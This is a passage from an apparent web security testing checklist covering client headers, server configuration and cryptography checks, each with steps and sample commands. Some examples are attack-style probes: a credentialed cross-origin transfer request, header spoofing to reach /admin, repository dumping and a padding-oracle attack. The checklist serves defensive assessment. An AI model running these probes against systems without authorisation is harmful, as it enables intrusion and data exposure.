  *Expected:* Every session cookie sets Secure, HttpOnly and an appropriate SameSite value, and uses a __Host- or __Secure- prefix.  
  *Refs:* asvs: V3.3.1, V3.3.2, V3.3.3, V3.3.4; cwe: CWE-614, CWE-1004, CWE-1275; capec: CAPEC-31

- [ ] **WEB-CLIENT-010** Test cookie size limit handling  
  *Severity if fail:* Low | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds application behavior when a cookie name and value exceed the browser storage limit.  
  *Steps:*
  1. Set a cookie whose name and value combined exceed 4096 bytes.
  2. Reload the page and check whether the browser stored and sent the oversized cookie.
  3. Confirm the application still functions correctly when the cookie is dropped.
  *Example:* `document.cookie = "big="+"A".repeat(4100)`  
  *Expected:* Cookies stay under 4096 bytes combined, and the application degrades safely if a browser drops an oversized cookie.  
  *Refs:* asvs: V3.3.5; cwe: CWE-1004

- [ ] **WEB-CLIENT-011** Test HSTS header presence and configuration  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L1  
  *Objective:* Finds missing or weak Strict-Transport-Security headers that allow protocol downgrade.  
  *Steps:*
  1. Request the site over HTTPS and inspect the Strict-Transport-Security response header.
  2. Confirm max-age is at least one year and includeSubDomains is present if subdomains use HTTPS.
  3. Check whether the domain is present on the HSTS preload list.
  *Example:* `curl -I https://target then check for Strict-Transport-Security: max-age=63072000; includeSubDomains`  
  *Expected:* Every HTTPS response sets Strict-Transport-Security with a max-age of at least one year and includeSubDomains where applicable.  
  *Refs:* asvs: V3.4.1, V3.7.4; cheatsheet: HTTP_Strict_Transport_Security_Cheat_Sheet

- [ ] **WEB-CLIENT-012** Test Content-Security-Policy header strength  
  *Severity if fail:* Medium | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds a missing CSP or a CSP that lacks object-src, base-uri or a strict script source list.  
  *Steps:*
  1. Request a page and inspect the Content-Security-Policy header or meta tag.
  2. Confirm object-src and base-uri are set to none.
  3. Confirm script-src uses nonces, hashes or an allowlist rather than unsafe-inline or unsafe-eval.
  4. Try the earlier reflected XSS payloads again with the CSP active to confirm it blocks execution.
  *Example:* `curl -I https://target then check Content-Security-Policy: object-src 'none'; base-uri 'none'; script-src 'nonce-RANDOM'`  
  *Expected:* The CSP sets object-src none, base-uri none, and restricts scripts with nonces, hashes or a narrow allowlist, blocking injected inline scripts.  
  *Refs:* asvs: V3.4.3, V3.4.7; cheatsheet: Content_Security_Policy_Cheat_Sheet; cwe: CWE-1021; capec: CAPEC-63

- [ ] **WEB-CLIENT-013** Test response headers for MIME sniffing and referrer leakage  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds missing X-Content-Type-Options and Referrer-Policy headers that leak data or allow MIME confusion.  
  *Steps:*
  1. Request several response types and inspect the X-Content-Type-Options header.
  2. Navigate from a page containing sensitive query parameters to an external link and inspect the Referer sent.
  3. Confirm a Referrer-Policy header or meta tag restricts what is sent cross-origin.
  *Example:* `curl -I https://target then check X-Content-Type-Options: nosniff and Referrer-Policy: strict-origin-when-cross-origin`  
  *Expected:* Every response sets X-Content-Type-Options: nosniff and a Referrer-Policy that avoids leaking sensitive URL data to third parties.  
  *Refs:* asvs: V3.4.4, V3.4.5; cheatsheet: HTML5_Security_Cheat_Sheet; cwe: CWE-116

- [ ] **WEB-CLIENT-014** Test Cross-Origin-Opener-Policy on document responses  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L3  
  *Objective:* Finds document responses missing Cross-Origin-Opener-Policy, allowing tabnabbing and frame counting.  
  *Steps:*
  1. Request the main HTML document and inspect the Cross-Origin-Opener-Policy header.
  2. Confirm the value is same-origin or same-origin-allow-popups as the application requires.
  3. Open the page from an attacker tab using window.open and check whether window references leak.
  *Example:* `curl -I https://target then check Cross-Origin-Opener-Policy: same-origin`  
  *Expected:* HTML document responses set Cross-Origin-Opener-Policy to same-origin or same-origin-allow-popups.  
  *Refs:* asvs: V3.4.8; cwe: CWE-1021

- [ ] **WEB-CLIENT-015** Test CORS preflight enforcement for sensitive actions  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds sensitive endpoints reachable by a simple cross-origin request that skips the CORS preflight.  
  *Steps:*
  1. Identify a sensitive endpoint relied on to be protected by the CORS preflight mechanism.
  2. Send the request cross-origin using only CORS-safelisted headers and a simple content type to avoid a preflight.
  3. Check whether the server processes the request despite not seeing an OPTIONS preflight.
  *Example:* `fetch("https://target/api/transfer",{method:"POST",credentials:"include",headers:{"Content-Type":"text/plain"},body:"amount=100"}) from an attacker page`  
  *Expected:* Sensitive endpoints require a custom header or a method that cannot be sent without a CORS preflight, or validate Origin and Content-Type strictly.  
  *Refs:* asvs: V3.5.1, V3.5.2; cwe: CWE-352; capec: CAPEC-62

- [ ] **WEB-CLIENT-016** Test state-changing endpoints for unsafe HTTP methods  
  *Severity if fail:* High | *Type:* Manual | *Level:* ASVS L1  
  *Objective:* Finds sensitive functionality reachable with a safe HTTP method such as GET.  
  *Steps:*
  1. Identify state-changing functionality, such as a delete or transfer action.
  2. Resend the action using the GET method instead of POST, PUT, PATCH or DELETE.
  3. Check the Sec-Fetch-* request headers the server receives and whether it validates them.
  *Example:* `GET /api/account/delete?id=123 HTTP/1.1 sent instead of the original DELETE request`  
  *Expected:* Sensitive functionality rejects safe HTTP methods and validates Sec-Fetch-* headers to block cross-origin navigation or resource loads.  
  *Refs:* asvs: V3.5.3; cwe: CWE-352; capec: CAPEC-62

- [ ] **WEB-CLIENT-017** Test that unrelated applications share a hostname insecurely  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds separate applications hosted on the same origin that weaken same-origin policy isolation.  
  *Steps:*
  1. Identify whether unrelated applications or trust levels are hosted under the same scheme, host and port.
  2. Check whether a lower-trust application can set cookies or access storage visible to the higher-trust application.
  3. Review hostname-based cookie scoping for each application.
  *Example:* `Compare cookie Domain and Path scoping between https://target/app1 and https://target/app2 sharing one origin`  
  *Expected:* Applications with different trust levels are hosted on separate hostnames so cookies and storage do not cross between them.  
  *Refs:* asvs: V3.5.4; cwe: CWE-346

- [ ] **WEB-CLIENT-018** Test externally hosted client-side assets for Subresource Integrity  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L3  
  *Objective:* Finds externally hosted scripts, styles or fonts loaded without an integrity attribute.  
  *Steps:*
  1. List every script, link and font tag that loads from an external host or CDN.
  2. Check each external tag for an integrity attribute with a matching hash.
  3. Confirm the asset is versioned and static rather than a mutable or latest-tag URL.
  *Example:* `<script src="https://cdn.example/lib.js" integrity="sha384-HASH" crossorigin="anonymous"></script>`  
  *Expected:* Every externally hosted static asset is versioned and loaded with a matching Subresource Integrity hash, or hosted internally.  
  *Refs:* asvs: V3.6.1; cheatsheet: Third_Party_Javascript_Management_Cheat_Sheet; cwe: CWE-829, CWE-494

- [ ] **WEB-CLIENT-019** Test for use of unsupported or insecure client-side technology  
  *Severity if fail:* Low | *Type:* Config Review | *Level:* ASVS L2  
  *Objective:* Finds pages that still rely on retired plugin technologies such as Flash, Silverlight or Java applets.  
  *Steps:*
  1. Review page source and network requests for plugin object or embed tags.
  2. Check for Flash, Silverlight, ActiveX, NACL or Java applet content types.
  3. Confirm the application functions fully without any retired plugin technology.
  *Example:* `grep -riE "application/x-shockwave-flash|silverlight|activex|applet" against page source and asset list`  
  *Expected:* No page relies on Flash, Silverlight, ActiveX, NACL or Java applets to function.  
  *Refs:* asvs: V3.7.1

- [ ] **WEB-CLIENT-020** Test browser security feature fallback behavior  
  *Severity if fail:* Info | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds applications that behave unsafely when an expected browser security feature is unsupported.  
  *Steps:*
  1. Review documentation or the application for expected browser security features such as CSP or HSTS support.
  2. Use a browser or a developer tools override that disables one expected feature, such as CSP enforcement.
  3. Confirm the application warns the user or blocks access rather than continuing silently without protection.
  *Example:* `Disable CSP enforcement in browser devtools or use a legacy user agent, then load the application`  
  *Expected:* The application warns the user or blocks access when a browser does not support an expected security feature, as documented.  
  *Refs:* asvs: V3.1.1, V3.7.5

- [ ] **WEB-CLIENT-021** Test authenticated resource embedding across origins  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L3  
  *Objective:* Finds authenticated images, scripts or documents that an attacker page can embed or load.  
  *Steps:*
  1. Identify an authenticated resource such as an image, video or script that is loaded while a session cookie is set.
  2. From an attacker page, embed the resource URL and check whether it loads using the victim session.
  3. Inspect the response for a Cross-Origin-Resource-Policy header and Sec-Fetch-Dest validation.
  *Example:* `<img src="https://target/private/avatar.jpg"> embedded on an attacker page while the victim is logged in`  
  *Expected:* The server validates Sec-Fetch-* headers or sets a restrictive Cross-Origin-Resource-Policy so other origins cannot load authenticated resources.  
  *Refs:* asvs: V3.5.8; cwe: CWE-346

- [ ] **WEB-CLIENT-022** Test query parameters for HTTP Parameter Pollution  
  *Severity if fail:* Medium | *Type:* Manual  
  *Objective:* Finds inconsistent handling of duplicate parameter names that can bypass validation or filters.  
  *Steps:*
  1. Submit a request with a parameter name duplicated with two different values.
  2. Compare the response to the single-parameter baseline to see which value the server and front-end filter used.
  3. Repeat with a duplicated parameter inside a JSON body if the endpoint accepts JSON.
  *Example:* `https://target/?mode=guest&search_string=kittens&search_string=puppies ; JSON: {"search_string":"kittens","search_string":"puppies"}`  
  *Expected:* The application and any filter in front of it handle duplicate parameters consistently and no security check can be bypassed by duplication.  
  *Refs:* wstg: WSTG-INJT-04; capec: CAPEC-460


## CONF

- [ ] **WEB-CONF-001** Review the network infrastructure configuration and known server vulnerabilities  
  *Severity if fail:* Medium | *Type:* Manual, Automated, Config Review  
  *Objective:* Find open ports, outdated servers and weak network rules around the application.  
  *Steps:*
  1. Get the list of ports that the application needs from the owner.
  2. Scan the hosts with Nmap and compare the open ports with the list.
  3. Run Nuclei or Nikto and check each version-based finding by hand.
  4. Review security groups, firewall and container network rules for rules that are wider than the list.
  5. Look at the admin interfaces of the infrastructure for default credentials.
  *Example:* `nmap -Pn -sV --script vuln -p- 192.0.2.10; nuclei -u https://example.com -severity medium,high,critical; nikto -h https://example.com`  
  *Expected:* Only needed ports are open. Components are patched. Network rules follow the change-controlled port list.  
  *Refs:* wstg: WSTG-CONF-01; owasp_top10: A02:2025; cwe: CWE-1188; capec: CAPEC-176

- [ ] **WEB-CONF-002** Remove default, sample and debug functionality from production  
  *Severity if fail:* High | *Type:* Manual, Automated, Config Review | *Level:* ASVS L2  
  *Objective:* Find sample applications, debug modes, debug endpoints and test code that remain in the production deployment.  
  *Steps:*
  1. Request known sample paths such as phpinfo.php, /swagger-ui, /actuator/env and framework welcome pages.
  2. Trigger an application error and look for stack traces, local variables or an interactive debugger.
  3. Look for DEBUG, FLASK_DEBUG and similar settings in the effective runtime configuration.
  4. Check GraphQL introspection and source maps in production builds.
  5. Review container images for sample files, build-time secrets and debug environment variables.
  6. Compare installed modules and features with the list of required functions.
  *Example:* `curl -si https://example.com/actuator/env; curl -si https://example.com/phpinfo.php; nuclei -u https://example.com -tags exposure,debug,misconfig`  
  *Expected:* No sample, test or debug functionality is reachable. Debug mode is off in all components. Only required functionality is deployed.  
  *Refs:* wstg: WSTG-CONF-02; asvs: V13.4.2, V15.2.3; owasp_top10: A02:2025; cwe: CWE-489, CWE-215, CWE-11; capec: CAPEC-176

- [ ] **WEB-CONF-003** Make sure documentation and monitoring endpoints are not exposed  
  *Severity if fail:* Medium | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find API documentation, health and metrics endpoints that are open to users who do not need them.  
  *Steps:*
  1. Request /swagger.json, /openapi.json, /api-docs, /graphql, /metrics, /health and /actuator without credentials.
  2. Request the same paths with a low-privilege account.
  3. Look in robots.txt and JavaScript files for more documentation paths.
  4. Read the content of each reachable endpoint for internal host names and secrets.
  5. Compare the result with the list of intended public endpoints.
  *Example:* `ffuf -u https://example.com/FUZZ -w api-docs-wordlist.txt -mc 200,401,403; curl -si https://example.com/openapi.json`  
  *Expected:* Documentation and monitoring endpoints need authentication and are limited to the intended network, or they do not exist.  
  *Refs:* wstg: WSTG-APIT-01, WSTG-CONF-05; asvs: V13.4.5; owasp_top10: A02:2025; cwe: CWE-200; capec: CAPEC-54

- [ ] **WEB-CONF-004** Find old, backup and unreferenced files and unsafe file extension handling  
  *Severity if fail:* High | *Type:* Manual, Automated, Config Review | *Level:* ASVS L3  
  *Objective:* Find backup copies, include files, archives and dumps that the web server serves in readable form.  
  *Steps:*
  1. Request common suffixes on known files: .bak, .old, .orig, .save, .swp, .inc, .zip and the tilde suffix.
  2. Request archives and dumps such as backup.zip, db.sql, .env and terraform.tfstate on the web root.
  3. Check how the server handles unknown and sensitive extensions in each directory.
  4. Try Windows 8.3 short names where the host runs Windows.
  5. Check cloud storage that holds static files for forgotten artifacts.
  6. Look at the server configuration for the allowed file extensions.
  *Example:* `ffuf -u https://example.com/FUZZ -w raft-medium-files.txt -e .bak,.old,.zip,.sql,.inc,.env,~ -mc 200; nuclei -u https://example.com -tags backup,config`  
  *Expected:* The web tier serves only files with approved extensions. No backup, dump or include file is reachable.  
  *Refs:* wstg: WSTG-CONF-03, WSTG-CONF-04; asvs: V13.4.7; owasp_top10: A02:2025; cwe: CWE-538, CWE-540, CWE-541; capec: CAPEC-150

- [ ] **WEB-CONF-005** Make sure source control metadata is not deployed or reachable  
  *Severity if fail:* High | *Type:* Manual, Automated | *Level:* ASVS L1  
  *Objective:* Find .git, .svn and similar folders that expose source code and history.  
  *Steps:*
  1. Request /.git/HEAD, /.git/config, /.svn/entries and /.hg/ on the web root and on each subpath.
  2. If a response is valid, dump the repository with a safe tool and look for secrets in the history.
  3. Check the deployed file tree and the container image for these folders.
  4. Check that the application process cannot read these folders.
  *Example:* `curl -si https://example.com/.git/HEAD; git-dumper https://example.com/.git ./dump && trufflehog git file://./dump`  
  *Expected:* Source control folders do not exist in the deployment, or the server and the application cannot read them.  
  *Refs:* asvs: V13.4.1; owasp_top10: A02:2025; cwe: CWE-538; capec: CAPEC-150

- [ ] **WEB-CONF-006** Make sure directory listing is disabled  
  *Severity if fail:* Medium | *Type:* Manual, Automated, Config Review | *Level:* ASVS L2  
  *Objective:* Find directories where the server shows a file index to users.  
  *Steps:*
  1. Request each directory path found during the crawl with and without a trailing slash.
  2. Request upload, static, backup and log directories.
  3. Look for index pages such as Index of or Directory listing for.
  4. Review the server configuration for the autoindex or Options Indexes setting.
  *Example:* `curl -s https://example.com/static/ | grep -iE 'index of|directory listing'; nikto -h https://example.com -Tuning 2`  
  *Expected:* The server returns 403 or 404 for directories without an index file. No file list is shown.  
  *Refs:* asvs: V13.4.3; owasp_top10: A02:2025; cwe: CWE-548; capec: CAPEC-127

- [ ] **WEB-CONF-007** Find admin interfaces and check them for weak exposure and default credentials  
  *Severity if fail:* High | *Type:* Manual, Automated  
  *Objective:* Find infrastructure and application admin consoles that are reachable by the wrong users or use default credentials.  
  *Steps:*
  1. Enumerate admin paths for the framework with a wordlist, and on alternative ports.
  2. Look at source comments and documentation for admin links.
  3. Check consoles such as Actuator, Kubernetes Dashboard, Jenkins, Portainer and database UIs.
  4. Try the documented default credentials of each product, within the rules of engagement.
  5. Make sure each console is not reachable from the public internet and uses TLS.
  6. Make sure setup wizards cannot run again.
  *Example:* `ffuf -u https://example.com/FUZZ -w admin-panels.txt -mc 200,301,302,401,403; nmap -p 8080,8443,9000,10250,2379 192.0.2.10`  
  *Expected:* Admin interfaces are not public, need strong authentication and TLS, and have no default credentials.  
  *Refs:* wstg: WSTG-CONF-05; owasp_top10: A02:2025; cwe: CWE-1188, CWE-668; capec: CAPEC-1

- [ ] **WEB-CONF-008** Make sure only needed HTTP methods work and method override is blocked  
  *Severity if fail:* Medium | *Type:* Manual, Automated, Config Review | *Level:* ASVS L3  
  *Objective:* Find enabled methods such as PUT, DELETE, CONNECT and WebDAV, and method override that bypass access control.  
  *Steps:*
  1. Send OPTIONS and read the Allow header.
  2. Send each method from the list, and an unknown method, to each key path.
  3. Send PUT to upload a test file and DELETE on a test file in a safe location.
  4. Try X-HTTP-Method-Override and the _method parameter on a protected action.
  5. Repeat the checks through the CDN or proxy and directly on the origin.
  6. Send the request with a mixed-case method name.
  *Example:* `curl -si -X OPTIONS https://example.com/; curl -si -X FOO https://example.com/; nmap -p443 --script http-methods --script-args http-methods.url-path=/ example.com`  
  *Expected:* Only the methods that the application supports are accepted. Other methods get 405 or 501 and unused methods are blocked.  
  *Refs:* wstg: WSTG-CONF-06, WSTG-INJT-03; asvs: V4.1.4; owasp_top10: A02:2025; cwe: CWE-650, CWE-749; capec: CAPEC-1

- [ ] **WEB-CONF-009** Make sure the HTTP TRACE method is not supported  
  *Severity if fail:* Low | *Type:* Manual, Automated | *Level:* ASVS L2  
  *Objective:* Find TRACE or TRACK support that echoes requests and leaks headers.  
  *Steps:*
  1. Send a TRACE request with a custom header to the host.
  2. Send a TRACK request to the host.
  3. Repeat on every HTTP service and port found.
  *Example:* `curl -si -X TRACE -H 'X-Test: 1' https://example.com/; nmap -p443 --script http-trace example.com`  
  *Expected:* The server rejects TRACE and TRACK with 405 or 501 and does not echo the request.  
  *Refs:* wstg: WSTG-CONF-06; asvs: V13.4.4; cwe: CWE-200

- [ ] **WEB-CONF-010** Review file and directory permissions on host, container and cloud storage  
  *Severity if fail:* Medium | *Type:* Config Review  
  *Objective:* Find files, secrets and volumes that have wider permissions than needed.  
  *Steps:*
  1. List permissions of web root, config, key, log, upload and temp directories with namei and ls -l.
  2. Look for world-writable files and files owned by root that the web user can change.
  3. Inspect the container image for root user and wide file modes.
  4. Review Kubernetes securityContext, Secret defaultMode and hostPath mounts.
  5. Review bucket ACLs and IAM bindings for public grants.
  *Example:* `namei -l /var/www/app/config; find /var/www -perm -o+w -type f; docker inspect --format '{{.Config.User}}' app:latest`  
  *Expected:* Files and secrets have least-privilege permissions. The web process cannot write to code or configuration.  
  *Refs:* wstg: WSTG-CONF-09; owasp_top10: A02:2025; cwe: CWE-732, CWE-276, CWE-250; capec: CAPEC-122

- [ ] **WEB-CONF-011** Find subdomain takeover through dangling DNS records  
  *Severity if fail:* High | *Type:* Manual, Automated  
  *Objective:* Find DNS records that point to external services that no longer exist and that an attacker can claim.  
  *Steps:*
  1. Enumerate subdomains with subfinder and keep names with CNAME, NS or MX records.
  2. Run subzy and the Nuclei takeover templates on the list.
  3. Resolve each hit with dig and compare the page with the can-i-take-over-xyz fingerprint.
  4. Check expired domains used in CNAME records.
  5. Do not claim the resource. Report the finding.
  *Example:* `subfinder -d example.com -silent | subzy run --targets /dev/stdin; nuclei -l subs.txt -t http/takeovers/; dig CNAME dev.example.com`  
  *Expected:* No DNS record points to an unclaimed or expired resource.  
  *Refs:* wstg: WSTG-CONF-10; owasp_top10: A02:2025; cwe: CWE-668; capec: CAPEC-148

- [ ] **WEB-CONF-012** Check cloud storage for public access, weak signed URLs and old versions  
  *Severity if fail:* High | *Type:* Manual, Automated, Config Review  
  *Objective:* Find buckets and containers that allow public listing, write access, long-lived signed URLs or exposed old object versions.  
  *Steps:*
  1. Find bucket URLs in page source and responses.
  2. Request the bucket root unauthenticated and look for a file list.
  3. Try an unauthenticated write to the bucket.
  4. Review ACL and policy for AllUsers and AuthenticatedUsers grants.
  5. Check signed URL expiry, scope and tampering of path and query.
  6. Check versioning for objects that were deleted but still readable.
  *Example:* `curl -si https://BUCKET.s3.amazonaws.com/; aws s3api get-bucket-acl --bucket BUCKET; S3Scanner scan -b BUCKET`  
  *Expected:* Buckets are private except for intended public assets. Signed URLs are short-lived and scoped. Deleted data is not readable.  
  *Refs:* wstg: WSTG-CONF-11; owasp_top10: A02:2025; cheatsheet: Secure_Cloud_Architecture_Cheat_Sheet; cwe: CWE-732, CWE-668; capec: CAPEC-150

- [ ] **WEB-CONF-013** Test path confusion between proxy, cache, WAF and application  
  *Severity if fail:* Medium | *Type:* Manual, Code Review  
  *Objective:* Find path variants that bypass access control or cache rules because components read the path in different ways.  
  *Steps:*
  1. Take a protected path and request it with a trailing slash, other case and double slash.
  2. Request it with dot segments and encoded separators such as %2f.
  3. Add a static extension such as /none.js to a dynamic path and look at the cache headers.
  4. Compare status code and body for each variant against the original.
  5. Review the route rules in the application for loose regular expressions.
  *Example:* `for p in /user/dashboard/ /User/Dashboard //user/dashboard /user%2Fdashboard /user/dashboard/none.js; do curl -s -o /dev/null -w "$p %{http_code}\n" https://example.com$p; done`  
  *Expected:* All path variants give the same access-control result. Dynamic pages are not cached by extension.  
  *Refs:* wstg: WSTG-CONF-13; owasp_top10: A02:2025; cwe: CWE-444, CWE-22; capec: CAPEC-153  
  *See:* WEB-CACHE-002

- [ ] **WEB-CONF-014** Check that security controls do not depend on client-controlled feature flags  
  *Severity if fail:* Medium | *Type:* Manual, Code Review  
  *Objective:* Find feature flags and kill switches that let a user turn off a security control or that fail open.  
  *Steps:*
  1. Find feature flags in JavaScript bundles, API responses and cookies.
  2. Change the flag values in the client and send the request again.
  3. Call the hidden function with a user that has no right, and look for server-side authorization.
  4. Block the flag service and look at how the application behaves.
  5. Read flag configuration for internal names and user segments.
  6. List old flags that are no longer toggled.
  *Example:* `grep -rEi 'featureflag|flags\.|launchdarkly|unleash' ./static/*.js; curl -s https://example.com/api/flags`  
  *Expected:* The server enforces authorization without regard to flag state. A failed flag service gives the safe default.  
  *Refs:* wstg: WSTG-CONF-15; owasp_top10: A02:2025; cwe: CWE-15, CWE-636

- [ ] **WEB-CONF-015** Make sure clients cannot override proxy headers or spoof the client IP  
  *Severity if fail:* High | *Type:* Manual, Config Review | *Level:* ASVS L2  
  *Objective:* Find headers such as X-Forwarded-For, X-Real-IP and X-User-ID that a user can set and that the application trusts.  
  *Steps:*
  1. List the headers that the proxy or load balancer sets for the application.
  2. Send the same headers with other values directly from the client.
  3. Send X-Forwarded-For with a spoofed address and look at the logs and the rate limit.
  4. Add the header name to the Connection header and look for stripped headers.
  5. Look at the proxy configuration for headers that it overwrites or removes.
  *Example:* `curl -si -H 'X-Forwarded-For: 127.0.0.1' -H 'X-Real-IP: 127.0.0.1' -H 'X-User-ID: 1' https://example.com/admin; curl -si -H 'Connection: close, X-Auth-User' https://example.com/`  
  *Expected:* The proxy overwrites or removes these headers from clients. The application uses the real client IP for logs and rate limits.  
  *Refs:* wstg: WSTG-CONF-14; asvs: V4.1.3, V15.3.4; cwe: CWE-348, CWE-290

- [ ] **WEB-CONF-016** Review the cross-domain policy files of legacy rich clients  
  *Severity if fail:* Low | *Type:* Manual  
  *Objective:* Find legacy crossdomain.xml and clientaccesspolicy.xml files that allow untrusted domains.  
  *Steps:*
  1. Request /crossdomain.xml and /clientaccesspolicy.xml.
  2. Look for wildcard domain entries.
  3. Remove the files if no legacy client needs them.
  *Example:* `curl -si https://example.com/crossdomain.xml; curl -si https://example.com/clientaccesspolicy.xml`  
  *Expected:* Policy files do not exist, or they list only trusted domains.  
  *Refs:* wstg: WSTG-CONF-08; owasp_top10: A02:2025; cwe: CWE-942


## CRYPTO

- [ ] **WEB-CRYPTO-001** Review the key management policy and the cryptographic inventory  
  *Severity if fail:* Medium | *Type:* Manual | *Level:* ASVS L2  
  *Objective:* Find missing key lifecycle rules and an incomplete list of keys, algorithms and certificates.  
  *Steps:*
  1. Ask for the key management policy and compare it with NIST SP 800-57.
  2. Look for rules on key generation, distribution, storage, rotation, compromise and destruction.
  3. Ask for the cryptographic inventory of keys, algorithms and certificates.
  4. Make sure the inventory states where each key may and may not be used.
  5. Make sure each shared secret is known to at most two parties and each private key to one.
  *Example:* `Document review checklist: policy exists, lifecycle covered, inventory current (date), owner named, key-use limits stated.`  
  *Expected:* A current policy and inventory exist, cover the full lifecycle, and limit key sharing and use.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.1.1, V11.1.2; owasp_top10: A04:2025; cwe: CWE-321

- [ ] **WEB-CRYPTO-002** Find all cryptography in use and check the migration plan  
  *Severity if fail:* Low | *Type:* Manual, Code Review | *Level:* ASVS L3  
  *Objective:* Find unknown cryptographic use and a missing plan for post-quantum change.  
  *Steps:*
  1. Run a cryptographic discovery scan of source code and dependencies.
  2. List encryption, hashing and signing operations and compare them with the inventory.
  3. Ask for the documented migration plan to post-quantum algorithms.
  4. Check that the plan names owners and dates.
  *Example:* `semgrep --config p/insecure-transport --config p/crypto ./src; cbomkit or CycloneDX CBOM export of the repository`  
  *Expected:* Discovery covers all cryptographic use, the inventory matches, and a migration plan exists.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.1.3, V11.1.4; owasp_top10: A04:2025

- [ ] **WEB-CRYPTO-003** Make sure industry-validated cryptographic libraries are used  
  *Severity if fail:* Medium | *Type:* Code Review | *Level:* ASVS L2  
  *Objective:* Find custom algorithms and unvalidated implementations.  
  *Steps:*
  1. Search the code for hand-written encryption, hash or random functions.
  2. List the cryptographic libraries and their versions.
  3. Check that each library is maintained and, where needed, validated, for example FIPS 140.
  4. Check that hardware acceleration uses vendor libraries.
  *Example:* `grep -rEn 'xor|rot13|custom.*(cipher|encrypt)' ./src; npm ls | grep -i crypto; pip list | grep -i crypt`  
  *Expected:* Only maintained, industry-validated libraries do cryptographic operations. No custom algorithms exist.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.2.1; owasp_top10: A04:2025; cwe: CWE-327, CWE-1240

- [ ] **WEB-CRYPTO-004** Check crypto agility of algorithms, key lengths and keys  
  *Severity if fail:* Low | *Type:* Manual, Code Review | *Level:* ASVS L2  
  *Objective:* Find hard-coded algorithms that the owner cannot change quickly after a break.  
  *Steps:*
  1. Find where algorithms, key lengths, rounds and modes are set.
  2. Check that configuration or one module changes them without a code rewrite.
  3. Do a test change of one algorithm in a test system.
  4. Check how the application replaces keys and certificates.
  *Example:* `grep -rEn 'AES|SHA|RSA|PBKDF2' ./src | wc -l; review config for algorithm settings`  
  *Expected:* The team can swap algorithms, key sizes, keys and certificates by configuration or in one place.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.2.2; owasp_top10: A04:2025

- [ ] **WEB-CRYPTO-005** Make sure all cryptographic primitives give at least 128 bits of security  
  *Severity if fail:* Medium | *Type:* Code Review, Automated | *Level:* ASVS L2  
  *Objective:* Find weak keys and algorithms such as DES, RC4, 1024-bit RSA, SHA-1 and 160-bit EC.  
  *Steps:*
  1. Search code and configuration for MD4, MD5, RC2, RC4, DES, Blowfish and SHA-1.
  2. Check the key sizes: RSA 3072 bits or more, EC 256 bits or more, AES 128 bits or more.
  3. Scan the server for weak primitives in TLS and SSH.
  4. Check PBKDF2 iteration counts.
  *Example:* `grep -rEniw 'md4|md5|rc2|rc4|des|3des|blowfish|sha-?1' ./src; nmap --script ssl-enum-ciphers -p443 example.com; semgrep --config p/crypto`  
  *Expected:* No primitive has less than 128 bits of security. Deprecated algorithms are not used.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.2.3; wstg: WSTG-CRYP-04; owasp_top10: A04:2025; cwe: CWE-326, CWE-327

- [ ] **WEB-CRYPTO-006** Make sure secret comparisons and cryptographic operations are constant-time  
  *Severity if fail:* Low | *Type:* Code Review, Manual | *Level:* ASVS L3  
  *Objective:* Find short-circuit comparisons that leak secrets through timing.  
  *Steps:*
  1. Find comparisons of MACs, tokens, hashes and passwords in the code.
  2. Check that they use constant-time functions such as hmac.compare_digest or MessageDigest.isEqual.
  3. Measure response time for guesses with a correct and a wrong prefix, many times.
  *Example:* `grep -rEn '==\s*.*(hmac|token|signature|digest)' ./src; python3 timing_probe.py https://example.com/api/verify`  
  *Expected:* No timing difference exists between correct and wrong prefixes. Comparisons use constant-time functions.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.2.4; cwe: CWE-208

- [ ] **WEB-CRYPTO-007** Make sure cryptographic failures give no padding oracle  
  *Severity if fail:* High | *Type:* Manual, Code Review | *Level:* ASVS L3  
  *Objective:* Find decryption code that shows different errors for padding failure, which lets an attacker decrypt data.  
  *Steps:*
  1. Find encrypted values sent to the client: cookies, hidden fields, tokens, URL parameters.
  2. Decode them and check for a block length that fits 8 or 16 bytes.
  3. Change one bit of the cipher text, and the last block, and send the value back.
  4. Compare status code, body, length and time of the three states: valid, garbled, padding error.
  5. Check in the code that the integrity check (HMAC or AEAD) runs before decryption.
  *Example:* `padbuster https://example.com/page.aspx 'Dg6W8OiWMIdVokIDH15T/A==' 16 -encoding 0; Burp Intruder on the last bytes of the value`  
  *Expected:* The application gives one uniform answer for any failure. An integrity check rejects changed data before decryption.  
  *Refs:* cheatsheet: Cryptographic_Storage_Cheat_Sheet, Key_Management_Cheat_Sheet; asvs: V11.2.5; wstg: WSTG-CRYP-02; owasp_top10: A04:2025; cwe: CWE-209, CWE-353; capec: CAPEC-463

- [ ] **WEB-CRYPTO-008** Make sure insecure block modes and padding schemes are not used  
  *Severity if fail:* Medium | *Type:* Code Review, Automated | *Level:* ASVS L1  
  *Objective:* Find ECB mode, unauthenticated CBC and PKCS#1 v1.5 padding.  
  *Steps:*
  1. Search for ECB, CBC and PKCS1Padding in the code and configuration.
  2. Check that RSA encryption uses OAEP and signatures use PSS.
  3. Check that SSH and other protocols do not use CBC.
  *Example:* `grep -rEn 'ECB|PKCS1Padding|RSA/ECB|AES/CBC|NoPadding' ./src; semgrep --config p/crypto`  
  *Expected:* No ECB or PKCS#1 v1.5 encryption padding is used. AEAD modes are the default.  
